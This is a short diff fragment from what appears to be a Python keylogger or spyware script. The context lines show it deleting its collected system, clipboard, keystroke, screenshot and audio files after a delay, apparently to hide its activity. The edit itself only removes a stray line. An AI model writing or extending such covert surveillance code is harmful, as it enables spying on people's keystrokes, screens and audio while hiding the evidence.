@@ -235,4 +235,3 @@ time.sleep(120)
 delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
 for file in delete_files:
     os.remove(file_merge + file)
-Z
